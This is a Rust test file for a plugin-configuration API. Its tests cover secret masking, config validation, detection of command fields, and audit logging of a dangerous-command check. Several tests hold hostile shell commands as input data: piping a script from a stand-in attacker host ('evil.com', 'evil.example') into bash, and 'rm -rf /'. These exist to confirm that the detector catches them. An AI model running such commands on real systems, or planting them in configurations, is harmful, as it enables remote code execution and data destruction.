#![expect(
    clippy::assertions_on_result_states,
    reason = "test assertions use assert!(result.is_ok()) pattern"
)]

#[cfg(feature = "db-sqlite")]
use super::batch_plugin_configs;
#[cfg(feature = "db-sqlite")]
use super::create_plugin_config;
#[cfg(feature = "db-sqlite")]
use super::delete_plugin_config;
use super::plugin_field_to_api_field;
#[cfg(feature = "db-sqlite")]
use super::update_plugin_config;
#[cfg(feature = "db-sqlite")]
use crate::AppState;
#[cfg(feature = "db-sqlite")]
use crate::app_state::AuditEmitterState;
#[cfg(feature = "db-sqlite")]
use crate::auth::AuthMethod;
#[cfg(feature = "db-sqlite")]
use crate::extract::Validated;
#[cfg(feature = "db-sqlite")]
use crate::middleware::action::CanManageCommands;
#[cfg(feature = "db-sqlite")]
use crate::middleware::require_auth::{AuthenticatedApiTokenId, AuthenticatedUser};
#[cfg(feature = "db-sqlite")]
use crate::tenant_db::TenantDb;
#[cfg(feature = "db-sqlite")]
use axum::{
    Extension,
    extract::{Path, State},
    http::StatusCode,
};
#[cfg(feature = "db-sqlite")]
use sea_orm::{ColumnTrait, ConnectionTrait, EntityTrait, QueryFilter, QueryOrder};
use serde_json::json;
#[cfg(feature = "db-sqlite")]
use std::sync::Arc;
use uptrakit_plugin_infrastructure_registry::{CatalogConfig, PluginConfigOps, build_catalog};
#[cfg(feature = "db-sqlite")]
use uptrakit_shared_db::entity::{audit_log, plugin_config, prelude::PluginConfig};
use uptrakit_shared_types::PluginTypeId;
#[cfg(feature = "db-sqlite")]
use uptrakit_web_api_types::batch_actions::BatchActionRequest;
#[cfg(feature = "db-sqlite")]
use uptrakit_web_api_types::plugin_configs::{
    CreatePluginConfigRequest, UpdatePluginConfigRequest,
};
use uptrakit_web_api_types::plugin_configs::{
    FieldType as ApiFieldType, SelectSource as ApiSelectSource,
};

fn catalog() -> impl PluginConfigOps {
    build_catalog(
        &CatalogConfig::default(),
        uptrakit_plugin_infrastructure_registry::InstancePluginStates::all_disabled(),
    )
    .expect("default catalog should build")
}

/// Sentinel value used to indicate a masked secret in API responses.
const SECRET_MASK: &str = "***";

#[test]
fn plugin_field_conversion_preserves_json_shape_and_semantics() {
    let plugin_field = json!({
        "key": "mode",
        "label": "Mode",
        "field_type": "future_picker",
        "required": true,
        "placeholder": "Choose mode",
        "help_text": "Used for forward-compatible field types",
        "default_value": {
            "mode": "smart",
            "limits": [1, 2, 3],
            "nested": {"flag": true}
        },
        "options": [{"value": "smart", "label": "Smart"}],
        "select_source": {"type": "action", "action_id": "demo.fetch-modes"},
        "sensitive": true,
        "list": true,
        "visible_when": {"field": "provider", "values": ["custom"]}
    });

    let api_field = plugin_field_to_api_field(plugin_field);
    assert_eq!(
        api_field.field_type,
        ApiFieldType::Other("future_picker".to_string())
    );
    assert_eq!(
        api_field.default_value,
        Some(json!({
            "mode": "smart",
            "limits": [1, 2, 3],
            "nested": {"flag": true}
        }))
    );
    assert_eq!(api_field.options.len(), 1);
    assert_eq!(
        api_field.select_source,
        Some(ApiSelectSource::Action {
            action_id: "demo.fetch-modes".to_string()
        })
    );
    assert_eq!(
        api_field
            .visible_when
            .expect("visible_when should be preserved")
            .field,
        "provider"
    );
    assert!(api_field.sensitive);
    assert!(api_field.list);
}

#[test]
fn mask_github_auth_token() {
    let config = serde_json::json!({
        "auth_token": "ghp_secret123"
    });
    let masked =
        catalog().mask_config_secrets(&PluginTypeId::from_static("releases.github"), &config);
    assert_eq!(masked["auth_token"], SECRET_MASK);
}

#[test]
fn mask_null_token_becomes_masked() {
    let config = serde_json::json!({
        "auth_token": null
    });
    let masked =
        catalog().mask_config_secrets(&PluginTypeId::from_static("releases.github"), &config);
    // Key present (even with a null value) still gets masked to "***".
    assert_eq!(masked["auth_token"], SECRET_MASK);
}

#[test]
fn mask_without_token_field_stays_absent() {
    let config = serde_json::json!({});
    let masked =
        catalog().mask_config_secrets(&PluginTypeId::from_static("releases.github"), &config);
    // Key-set masking is sparse-preserving: a sensitive path absent from the
    // input never gets injected into the output.
    assert!(
        masked.get("auth_token").is_none(),
        "sparse config must not gain an auth_token key, got: {masked:?}"
    );
}

#[test]
fn mask_unknown_plugin_type() {
    let config = serde_json::json!({"key": "value"});
    let masked = catalog().mask_config_secrets(&PluginTypeId::from_static("unknown_type"), &config);
    assert_eq!(masked, config);
}

#[test]
fn restore_masked_token() {
    let mut incoming = serde_json::json!({"auth_token": "***"});
    let existing = serde_json::json!({"auth_token": "ghp_real_token"});
    catalog().restore_config_secrets(
        &PluginTypeId::from_static("releases.github"),
        &mut incoming,
        &existing,
    );
    assert_eq!(incoming["auth_token"], "ghp_real_token");
}

#[test]
fn restore_new_token_not_masked() {
    let mut incoming = serde_json::json!({"auth_token": "ghp_new_token"});
    let existing = serde_json::json!({"auth_token": "ghp_old_token"});
    catalog().restore_config_secrets(
        &PluginTypeId::from_static("releases.github"),
        &mut incoming,
        &existing,
    );
    assert_eq!(incoming["auth_token"], "ghp_new_token");
}

#[test]
fn validate_valid_github_config() {
    let config = serde_json::json!({});
    assert!(
        catalog()
            .validate_config(&PluginTypeId::from_static("releases.github"), &config)
            .is_ok()
    );
}

#[test]
fn validate_invalid_github_config() {
    // Non-https api_base_url fails validation.
    let config = serde_json::json!({"api_base_url": "http://api.github.com"});
    assert!(
        catalog()
            .validate_config(&PluginTypeId::from_static("releases.github"), &config)
            .is_err()
    );
}

#[test]
fn validate_unknown_plugin_type() {
    let config = serde_json::json!({});
    assert!(
        catalog()
            .validate_config(&PluginTypeId::from_static("nonexistent"), &config)
            .is_err()
    );
}

#[test]
fn parse_known_plugin_types() {
    let github_config = serde_json::json!({});
    assert!(
        catalog()
            .validate_config(
                &PluginTypeId::from_static("releases.github"),
                &github_config
            )
            .is_ok()
    );

    let proxmox_config = serde_json::json!({
        "script_url": "https://example.com/update.sh"
    });
    assert!(
        catalog()
            .validate_config(
                &PluginTypeId::from_static("discovery.proxmox-helper-scripts"),
                &proxmox_config
            )
            .is_ok()
    );

    let docker_config = serde_json::json!({});
    assert!(
        catalog()
            .validate_config(
                &PluginTypeId::from_static("releases.docker"),
                &docker_config
            )
            .is_ok()
    );

    let homebrew_config = serde_json::json!({});
    assert!(
        catalog()
            .validate_config(
                &PluginTypeId::from_static("package-manager.homebrew"),
                &homebrew_config
            )
            .is_ok()
    );

    assert!(
        catalog()
            .validate_config(&PluginTypeId::from_static("unknown"), &homebrew_config)
            .is_err()
    );
}

#[cfg(feature = "dashboard-icons")]
#[test]
fn dashboard_icons_exposes_type_settings_via_plugin_types_metadata() {
    let plugin_type = PluginTypeId::from_static("enhancement.dashboard-icons");
    let form_fields = catalog()
        .type_settings_form_schema(&plugin_type)
        .expect("dashboard icons should expose type settings");
    assert_eq!(form_fields.len(), 1);
    assert_eq!(form_fields[0].key, "enabled");

    let sample = catalog().type_settings_sample(&plugin_type);
    assert_eq!(sample, serde_json::json!({ "enabled": true }));
}

// --- Homebrew plugin tests ---

#[test]
fn validate_valid_homebrew_config() {
    let config = serde_json::json!({});
    assert!(
        catalog()
            .validate_config(
                &PluginTypeId::from_static("package-manager.homebrew"),
                &config
            )
            .is_ok()
    );
}

#[test]
fn validate_homebrew_config_with_cask() {
    let config = serde_json::json!({"package_type": "cask"});
    assert!(
        catalog()
            .validate_config(
                &PluginTypeId::from_static("package-manager.homebrew"),
                &config
            )
            .is_ok()
    );
}

#[test]
fn mask_homebrew_config_unchanged() {
    let config = serde_json::json!({"package_type": "formula"});
    let masked = catalog().mask_config_secrets(
        &PluginTypeId::from_static("package-manager.homebrew"),
        &config,
    );
    // No secrets to mask — config returned unchanged
    assert_eq!(masked, config);
}

// --- Docker plugin tests ---

#[test]
fn mask_docker_basic_password() {
    let config = serde_json::json!({
        "auth": {
            "type": "basic",
            "username": "user",
            "password": "secret123"
        }
    });
    let masked =
        catalog().mask_config_secrets(&PluginTypeId::from_static("releases.docker"), &config);
    assert_eq!(masked["auth"]["password"], SECRET_MASK);
    assert_eq!(masked["auth"]["username"], "user");
}

#[test]
fn mask_docker_bearer_token() {
    let config = serde_json::json!({
        "auth": {
            "type": "bearer",
            "token": "ghcr_token_secret"
        }
    });
    let masked =
        catalog().mask_config_secrets(&PluginTypeId::from_static("releases.docker"), &config);
    assert_eq!(masked["auth"]["token"], SECRET_MASK);
}

#[test]
fn mask_docker_no_auth() {
    let config = serde_json::json!({});
    let masked =
        catalog().mask_config_secrets(&PluginTypeId::from_static("releases.docker"), &config);
    // Key-set masking is sparse-preserving: no "auth" key in the input means
    // no "auth" key gets injected into the output.
    assert!(masked.get("auth").is_none());
}

#[test]
fn mask_docker_null_auth() {
    let config = serde_json::json!({ "auth": null });
    let masked =
        catalog().mask_config_secrets(&PluginTypeId::from_static("releases.docker"), &config);
    // Key-set masking only rewrites leaf paths ("auth.password"/"auth.token")
    // that are reachable through a JSON object; "auth": null has no object to
    // descend into, so it passes through untouched rather than being dropped.
    assert_eq!(masked["auth"], serde_json::Value::Null);
}

#[test]
fn restore_docker_masked_password() {
    let mut incoming = serde_json::json!({
        "auth": {
            "type": "basic",
            "username": "user",
            "password": "***"
        }
    });
    let existing = serde_json::json!({
        "auth": {
            "type": "basic",
            "username": "user",
            "password": "real_password"
        }
    });
    catalog().restore_config_secrets(
        &PluginTypeId::from_static("releases.docker"),
        &mut incoming,
        &existing,
    );
    assert_eq!(incoming["auth"]["password"], "real_password");
}

#[test]
fn restore_docker_masked_token() {
    let mut incoming = serde_json::json!({
        "auth": {
            "type": "bearer",
            "token": "***"
        }
    });
    let existing = serde_json::json!({
        "auth": {
            "type": "bearer",
            "token": "real_token"
        }
    });
    catalog().restore_config_secrets(
        &PluginTypeId::from_static("releases.docker"),
        &mut incoming,
        &existing,
    );
    assert_eq!(incoming["auth"]["token"], "real_token");
}

#[test]
fn restore_docker_new_password_not_masked() {
    let mut incoming = serde_json::json!({
        "auth": {
            "type": "basic",
            "username": "user",
            "password": "new_password"
        }
    });
    let existing = serde_json::json!({
        "auth": {
            "type": "basic",
            "username": "user",
            "password": "old_password"
        }
    });
    catalog().restore_config_secrets(
        &PluginTypeId::from_static("releases.docker"),
        &mut incoming,
        &existing,
    );
    assert_eq!(incoming["auth"]["password"], "new_password");
}

#[test]
fn validate_valid_docker_config() {
    // Empty config is valid — no required fields
    let config = serde_json::json!({});
    assert!(
        catalog()
            .validate_config(&PluginTypeId::from_static("releases.docker"), &config)
            .is_ok()
    );
}

#[test]
fn validate_docker_config_with_auth() {
    let config = serde_json::json!({
        "tracked_tag": "main",
        "auth": {
            "type": "bearer",
            "token": "ghcr_token"
        }
    });
    assert!(
        catalog()
            .validate_config(&PluginTypeId::from_static("releases.docker"), &config)
            .is_ok()
    );
}

#[test]
fn validate_docker_config_old_semver_fields_are_ignored() {
    // Configs stored before the digest-tracking refactor may contain
    // tracking_mode / tag_patterns / page_size — they must be silently ignored.
    let config = serde_json::json!({
        "tracking_mode": "semver_tags",
        "tag_patterns": ["^v[0-9]+"],
        "page_size": 500
    });
    assert!(
        catalog()
            .validate_config(&PluginTypeId::from_static("releases.docker"), &config)
            .is_ok(),
        "old semver fields should be silently ignored"
    );
}

// ── detect_command_fields tests ──────────────────────────────────────

use super::command_safety::detect_command_fields;

#[test]
fn detect_shell_config_command_fields() {
    let config = serde_json::json!({
        "version_command": "dpkg -l | grep foo",
        "update_command": "apt-get install -y foo"
    });
    let fields = detect_command_fields(&config);
    assert!(fields.contains(&"version_command"));
    assert!(fields.contains(&"update_command"));
    assert_eq!(fields.len(), 2);
}

#[test]
fn detect_docker_post_pull_command() {
    let config = serde_json::json!({
        "post_pull_command": "docker-compose up -d"
    });
    let fields = detect_command_fields(&config);
    assert_eq!(fields, vec!["post_pull_command"]);
}

#[test]
fn detect_structured_hooks() {
    let config = serde_json::json!({
        "hooks": {
            "pre_update": {
                "commands": ["systemctl stop myapp"]
            },
            "post_update": {
                "commands": ["systemctl start myapp"]
            }
        }
    });
    let fields = detect_command_fields(&config);
    assert!(fields.contains(&"hooks.pre_update.commands"));
    assert!(fields.contains(&"hooks.post_update.commands"));
    assert_eq!(fields.len(), 2);
}

#[test]
fn detect_legacy_hook_commands() {
    let config = serde_json::json!({
        "pre_update_commands": ["stop-service"],
        "post_update_commands": ["start-service"]
    });
    let fields = detect_command_fields(&config);
    assert!(fields.contains(&"pre_update_commands"));
    assert!(fields.contains(&"post_update_commands"));
    assert_eq!(fields.len(), 2);
}

#[test]
fn detect_no_command_fields() {
    let config = serde_json::json!({
        "tracked_tag": "latest",
        "auth": { "type": "bearer", "token": "tok" }
    });
    let fields = detect_command_fields(&config);
    assert!(fields.is_empty());
}

#[test]
fn detect_null_command_fields_excluded() {
    let config = serde_json::json!({
        "version_command": null,
        "update_command": "apt-get update"
    });
    let fields = detect_command_fields(&config);
    assert_eq!(fields, vec!["update_command"]);
}

#[test]
fn detect_non_object_config_returns_empty() {
    let config = serde_json::json!("not an object");
    let fields = detect_command_fields(&config);
    assert!(fields.is_empty());
}

#[test]
fn detect_empty_hooks_commands_excluded() {
    let config = serde_json::json!({
        "hooks": {
            "pre_update": {
                "commands": []
            }
        }
    });
    let fields = detect_command_fields(&config);
    assert!(fields.is_empty(), "empty commands array should be excluded");
}

// ── collect_dangerous_patterns tests ──────────────────────────────

use super::command_safety::collect_dangerous_patterns;
use super::command_safety::format_dangerous_pattern_rejection;

#[test]
fn collect_dangerous_curl_pipe_bash() {
    let config = serde_json::json!({
        "version_command": "curl https://evil.com/payload | bash"
    });
    let matches = collect_dangerous_patterns(&config);
    assert!(!matches.is_empty());
    assert!(matches[0].field == "version_command");
    assert!(matches[0].description.contains("remote script"));
}

#[test]
fn collect_dangerous_hook_commands() {
    let config = serde_json::json!({
        "hooks": {
            "pre_update": {
                "commands": ["rm -rf /"]
            }
        }
    });
    let matches = collect_dangerous_patterns(&config);
    assert!(!matches.is_empty());
    assert_eq!(matches[0].field, "hooks.pre_update.commands[0]");
    assert!(matches[0].description.contains("recursive delete"));
}

#[test]
fn collect_no_dangerous_patterns_benign() {
    let config = serde_json::json!({
        "version_command": "dpkg -l | grep nginx",
        "update_command": "apt-get install -y nginx"
    });
    let matches = collect_dangerous_patterns(&config);
    assert!(matches.is_empty());
}

#[test]
fn collect_non_object_returns_empty() {
    let config = serde_json::json!("not an object");
    let matches = collect_dangerous_patterns(&config);
    assert!(matches.is_empty());
}

#[test]
fn format_rejection_message() {
    let matches = vec![super::command_safety::DangerousPatternMatch {
        field: "version_command".to_string(),
        description: "pipe remote script to shell",
    }];
    let msg = format_dangerous_pattern_rejection(&matches);
    assert!(msg.contains("dangerous command patterns"));
    assert!(msg.contains("version_command"));
    assert!(msg.contains("pipe remote script to shell"));
}

#[cfg(feature = "db-sqlite")]
async fn latest_tenant_audit_row(
    db: &sea_orm::DatabaseConnection,
    action_type: uptrakit_audit_log::RegisteredAuditAction,
) -> audit_log::Model {
    for _ in 0..50 {
        if let Some(row) = audit_log::Entity::find()
            .filter(audit_log::Column::ActionType.eq(action_type))
            .order_by_desc(audit_log::Column::OccurredAt)
            .one(db)
            .await
            .expect("query tenant audit rows")
        {
            return row;
        }

        tokio::time::sleep(std::time::Duration::from_millis(10)).await;
    }

    panic!("expected tenant audit row for action_type={action_type}");
}

#[cfg(feature = "db-sqlite")]
fn audit_details(row: &audit_log::Model) -> serde_json::Value {
    row.details_json
        .clone()
        .expect("audit row should contain details_json")
}

#[cfg(feature = "db-sqlite")]
#[tokio::test]
async fn create_plugin_config_denied_dangerous_commands_writes_denied_audit_event() {
    let db = crate::test_harness::setup_migrated_db().await;
    let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
    let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;
    let mut state = match Arc::try_unwrap(state) {
        Ok(state) => state,
        Err(_) => panic!("expected unique app state in this unit test"),
    };
    state.reject_dangerous_commands = true;
    let state = Arc::new(state);

    let actor_user_id = uuid::Uuid::now_v7();
    let actor_token_id = uuid::Uuid::now_v7();
    let response = create_plugin_config(
        State(Arc::clone(&state)),
        TenantDb::new_for_test(db.clone(), tenant_id),
        CanManageCommands::new(AuthenticatedUser::new(
            actor_user_id,
            AuthMethod::ApiToken,
            None,
        )),
        Some(Extension(AuthenticatedApiTokenId(actor_token_id))),
        Validated(CreatePluginConfigRequest {
            name: "Denied Dangerous Config".to_string(),
            plugin_type: PluginTypeId::from_static("generic.shell"),
            config: serde_json::json!({
                "version_command": "curl https://evil.example/install.sh | bash"
            }),
            enabled: true,
        }),
    )
    .await;

    assert_eq!(response.status(), StatusCode::BAD_REQUEST);

    let row = latest_tenant_audit_row(
        &db,
        uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_CREATE,
    )
    .await;
    assert_eq!(
        row.outcome,
        uptrakit_audit_log::AuditOutcome::Denied.as_str()
    );
    assert_eq!(
        row.actor_type,
        uptrakit_audit_log::AuditActorType::ApiToken.as_str()
    );
    assert_eq!(row.actor_id, Some(actor_token_id));
}

#[cfg(feature = "db-sqlite")]
#[tokio::test]
async fn create_plugin_config_success_persists_command_risk_details() {
    let db = crate::test_harness::setup_migrated_db().await;
    let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
    let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;

    let actor_user_id = uuid::Uuid::now_v7();
    let response = create_plugin_config(
        State(Arc::clone(&state)),
        TenantDb::new_for_test(db.clone(), tenant_id),
        CanManageCommands::new(AuthenticatedUser::new(
            actor_user_id,
            AuthMethod::ApiToken,
            None,
        )),
        None,
        Validated(CreatePluginConfigRequest {
            name: "Risky Config".to_string(),
            plugin_type: PluginTypeId::from_static("generic.shell"),
            config: serde_json::json!({
                "version_command": "curl https://evil.example/install.sh | bash"
            }),
            enabled: true,
        }),
    )
    .await;

    assert_eq!(response.status(), StatusCode::CREATED);

    let row = latest_tenant_audit_row(
        &db,
        uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_CREATE,
    )
    .await;
    assert_eq!(
        row.outcome,
        uptrakit_audit_log::AuditOutcome::Success.as_str()
    );
    let details = audit_details(&row);
    assert_eq!(details["contains_command_fields"], serde_json::json!(true));
    assert_eq!(
        details["command_fields"],
        serde_json::json!(["version_command"])
    );
    assert_eq!(
        details["dangerous_command_match_count"],
        serde_json::json!(1)
    );
    assert_eq!(
        details["dangerous_matches"][0]["field"],
        serde_json::json!("version_command")
    );
    assert!(
        !details
            .to_string()
            .contains("https://evil.example/install.sh"),
        "semantic audit details must not store raw command content"
    );
}

#[cfg(feature = "db-sqlite")]
#[tokio::test]
async fn update_plugin_config_success_persists_command_risk_details() {
    let db = crate::test_harness::setup_migrated_db().await;
    let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
    let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;

    let actor_user_id = uuid::Uuid::now_v7();
    let create_response = create_plugin_config(
        State(Arc::clone(&state)),
        TenantDb::new_for_test(db.clone(), tenant_id),
        CanManageCommands::new(AuthenticatedUser::new(
            actor_user_id,
            AuthMethod::ApiToken,
            None,
        )),
        None,
        Validated(CreatePluginConfigRequest {
            name: "Update Risk Seed".to_string(),
            plugin_type: PluginTypeId::from_static("generic.shell"),
            config: serde_json::json!({ "version_command": "echo v1.0.0" }),
            enabled: true,
        }),
    )
    .await;
    assert_eq!(create_response.status(), StatusCode::CREATED);

    let created = PluginConfig::find()
        .filter(plugin_config::Column::TenantId.eq(tenant_id))
        .filter(plugin_config::Column::Name.eq("Update Risk Seed"))
        .filter(plugin_config::Column::DeactivatedAt.is_null())
        .order_by_desc(plugin_config::Column::CreatedAt)
        .one(&db)
        .await
        .expect("query created plugin config")
        .expect("created plugin config row");

    let update_response = update_plugin_config(
        State(Arc::clone(&state)),
        TenantDb::new_for_test(db.clone(), tenant_id),
        Path(created.id),
        CanManageCommands::new(AuthenticatedUser::new(
            actor_user_id,
            AuthMethod::ApiToken,
            None,
        )),
        None,
        crate::extract::Unvalidated::new_for_test(UpdatePluginConfigRequest {
            name: Some("Update Risk Applied".to_string()),
            config: Some(serde_json::json!({
                "version_command": "curl https://evil.example/install.sh | bash"
            })),
            enabled: Some(true),
        }),
    )
    .await;
    assert_eq!(update_response.status(), StatusCode::OK);

    let row = latest_tenant_audit_row(
        &db,
        uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_UPDATE,
    )
    .await;
    assert_eq!(
        row.outcome,
        uptrakit_audit_log::AuditOutcome::Success.as_str()
    );
    let details = audit_details(&row);
    assert_eq!(details["contains_command_fields"], serde_json::json!(true));
    assert_eq!(
        details["command_fields"],
        serde_json::json!(["version_command"])
    );
    assert_eq!(
        details["dangerous_command_match_count"],
        serde_json::json!(1)
    );
}

#[cfg(feature = "db-sqlite")]
#[tokio::test]
async fn delete_plugin_config_success_persists_command_risk_details() {
    let db = crate::test_harness::setup_migrated_db().await;
    let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
    let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;

    let actor_user_id = uuid::Uuid::now_v7();
    let create_response = create_plugin_config(
        State(Arc::clone(&state)),
        TenantDb::new_for_test(db.clone(), tenant_id),
        CanManageCommands::new(AuthenticatedUser::new(
            actor_user_id,
            AuthMethod::ApiToken,
            None,
        )),
        None,
        Validated(CreatePluginConfigRequest {
            name: "Delete Risk Seed".to_string(),
            plugin_type: PluginTypeId::from_static("generic.shell"),
            config: serde_json::json!({
                "version_command": "curl https://evil.example/install.sh | bash"
            }),
            enabled: true,
        }),
    )
    .await;
    assert_eq!(create_response.status(), StatusCode::CREATED);

    let created = PluginConfig::find()
        .filter(plugin_config::Column::TenantId.eq(tenant_id))
        .filter(plugin_config::Column::Name.eq("Delete Risk Seed"))
        .filter(plugin_config::Column::DeactivatedAt.is_null())
        .order_by_desc(plugin_config::Column::CreatedAt)
        .one(&db)
        .await
        .expect("query created plugin config")
        .expect("created plugin config row");

    let delete_response = delete_plugin_config(
        State(Arc::clone(&state)),
        TenantDb::new_for_test(db.clone(), tenant_id),
        Path(created.id),
        CanManageCommands::new(AuthenticatedUser::new(
            actor_user_id,
            AuthMethod::ApiToken,
            None,
        )),
        None,
    )
    .await;
    assert_eq!(delete_response.status(), StatusCode::NO_CONTENT);

    let row = latest_tenant_audit_row(
        &db,
        uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
    )
    .await;
    assert_eq!(
        row.outcome,
        uptrakit_audit_log::AuditOutcome::Success.as_str()
    );
    let details = audit_details(&row);
    assert_eq!(details["contains_command_fields"], serde_json::json!(true));
    assert_eq!(
        details["command_fields"],
        serde_json::json!(["version_command"])
    );
    assert_eq!(
        details["dangerous_command_match_count"],
        serde_json::json!(1)
    );
}

#[cfg(feature = "db-sqlite")]
#[tokio::test]
async fn delete_plugin_config_not_found_writes_denied_audit_event() {
    let db = crate::test_harness::setup_migrated_db().await;
    let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
    let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;

    let actor_user_id = uuid::Uuid::now_v7();
    let missing_id = uuid::Uuid::now_v7();
    let response = delete_plugin_config(
        State(Arc::clone(&state)),
        TenantDb::new_for_test(db.clone(), tenant_id),
        Path(missing_id),
        CanManageCommands::new(AuthenticatedUser::new(
            actor_user_id,
            AuthMethod::ApiToken,
            None,
        )),
        None,
    )
    .await;
    assert_eq!(response.status(), StatusCode::NOT_FOUND);

    let row = latest_tenant_audit_row(
        &db,
        uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
    )
    .await;
    assert_eq!(
        row.outcome,
        uptrakit_audit_log::AuditOutcome::Denied.as_str()
    );
    let details = audit_details(&row);
    assert_eq!(
        details["reason_code"],
        serde_json::json!("plugin_config_not_found")
    );
}

#[cfg(feature = "db-sqlite")]
#[tokio::test]
async fn delete_plugin_config_load_db_failure_writes_failed_audit_event() {
    let db = crate::test_harness::setup_migrated_db().await;
    let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
    let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;

    crate::test_harness::fixtures::drop_table(&db, "plugin_configs").await;

    let actor_user_id = uuid::Uuid::now_v7();
    let response = delete_plugin_config(
        State(Arc::clone(&state)),
        TenantDb::new_for_test(db.clone(), tenant_id),
        Path(uuid::Uuid::now_v7()),
        CanManageCommands::new(AuthenticatedUser::new(
            actor_user_id,
            AuthMethod::ApiToken,
            None,
        )),
        None,
    )
    .await;
    assert_eq!(response.status(), StatusCode::INTERNAL_SERVER_ERROR);

    let row = latest_tenant_audit_row(
        &db,
        uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
    )
    .await;
    assert_eq!(
        row.outcome,
        uptrakit_audit_log::AuditOutcome::Failed.as_str()
    );
    let details = audit_details(&row);
    assert_eq!(
        details["reason_code"],
        serde_json::json!("plugin_config_delete_failed")
    );
}

#[cfg(feature = "db-sqlite")]
#[tokio::test]
async fn delete_plugin_config_delete_db_failure_writes_failed_audit_event() {
    let db = crate::test_harness::setup_migrated_db().await;
    let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
    let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;

    let actor_user_id = uuid::Uuid::now_v7();
    let create_response = create_plugin_config(
        State(Arc::clone(&state)),
        TenantDb::new_for_test(db.clone(), tenant_id),
        CanManageCommands::new(AuthenticatedUser::new(
            actor_user_id,
            AuthMethod::ApiToken,
            None,
        )),
        None,
        Validated(CreatePluginConfigRequest {
            name: "Delete Failure Seed".to_string(),
            plugin_type: PluginTypeId::from_static("generic.shell"),
            config: serde_json::json!({ "version_command": "echo v1.0.0" }),
            enabled: true,
        }),
    )
    .await;
    assert_eq!(create_response.status(), StatusCode::CREATED);

    let created = PluginConfig::find()
        .filter(plugin_config::Column::TenantId.eq(tenant_id))
        .filter(plugin_config::Column::Name.eq("Delete Failure Seed"))
        .filter(plugin_config::Column::DeactivatedAt.is_null())
        .order_by_desc(plugin_config::Column::CreatedAt)
        .one(&db)
        .await
        .expect("query created plugin config")
        .expect("created plugin config row");

    db.execute_unprepared(
        "CREATE TRIGGER plugin_config_block_soft_delete BEFORE UPDATE ON plugin_configs BEGIN SELECT RAISE(ABORT, 'blocked'); END;",
    )
    .await
    .expect("create blocking trigger");

    let delete_response = delete_plugin_config(
        State(Arc::clone(&state)),
        TenantDb::new_for_test(db.clone(), tenant_id),
        Path(created.id),
        CanManageCommands::new(AuthenticatedUser::new(
            actor_user_id,
            AuthMethod::ApiToken,
            None,
        )),
        None,
    )
    .await;
    assert_eq!(delete_response.status(), StatusCode::INTERNAL_SERVER_ERROR);

    let row = latest_tenant_audit_row(
        &db,
        uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
    )
    .await;
    assert_eq!(
        row.outcome,
        uptrakit_audit_log::AuditOutcome::Failed.as_str()
    );
    let details = audit_details(&row);
    assert_eq!(
        details["reason_code"],
        serde_json::json!("plugin_config_delete_failed")
    );
}

#[cfg(feature = "db-sqlite")]
#[tokio::test]
async fn batch_plugin_configs_unknown_action_writes_validation_failed_audit_event() {
    let db = crate::test_harness::setup_migrated_db().await;
    let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
    let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;

    let actor_user_id = uuid::Uuid::now_v7();
    let response = batch_plugin_configs(
        State(AuditEmitterState(state.audit_emitter.clone())),
        TenantDb::new_for_test(db.clone(), tenant_id),
        CanManageCommands::new(AuthenticatedUser::new(
            actor_user_id,
            AuthMethod::ApiToken,
            None,
        )),
        None,
        Validated(BatchActionRequest {
            action: "archive".to_string(),
            ids: vec![uuid::Uuid::now_v7()],
        }),
    )
    .await;

    assert_eq!(response.status(), StatusCode::BAD_REQUEST);

    let row = latest_tenant_audit_row(
        &db,
        uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
    )
    .await;
    assert_eq!(
        row.outcome,
        uptrakit_audit_log::AuditOutcome::ValidationFailed.as_str()
    );
    let details = audit_details(&row);
    assert_eq!(details["reason_code"], serde_json::json!("unknown_action"));
}

#[cfg(feature = "db-sqlite")]
#[tokio::test]
async fn batch_plugin_configs_delete_backend_failure_writes_failed_audit_event() {
    let db = crate::test_harness::setup_migrated_db().await;
    let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
    let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;

    crate::test_harness::fixtures::drop_table(&db, "plugin_configs").await;

    let actor_user_id = uuid::Uuid::now_v7();
    let response = batch_plugin_configs(
        State(AuditEmitterState(state.audit_emitter.clone())),
        TenantDb::new_for_test(db.clone(), tenant_id),
        CanManageCommands::new(AuthenticatedUser::new(
            actor_user_id,
            AuthMethod::ApiToken,
            None,
        )),
        None,
        Validated(BatchActionRequest {
            action: "delete".to_string(),
            ids: vec![uuid::Uuid::now_v7()],
        }),
    )
    .await;

    assert_eq!(response.status(), StatusCode::INTERNAL_SERVER_ERROR);

    let row = latest_tenant_audit_row(
        &db,
        uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
    )
    .await;
    assert_eq!(
        row.outcome,
        uptrakit_audit_log::AuditOutcome::Failed.as_str()
    );
    let details = audit_details(&row);
    assert_eq!(
        details["reason_code"],
        serde_json::json!("batch_delete_failed")
    );
}

#[cfg(feature = "db-sqlite")]
async fn create_seed_plugin_config(
    state: Arc<AppState>,
    db: sea_orm::DatabaseConnection,
    tenant_id: uuid::Uuid,
    name: &str,
) -> uuid::Uuid {
    let actor_user_id = uuid::Uuid::now_v7();
    let create_response = create_plugin_config(
        State(state),
        TenantDb::new_for_test(db.clone(), tenant_id),
        CanManageCommands::new(AuthenticatedUser::new(
            actor_user_id,
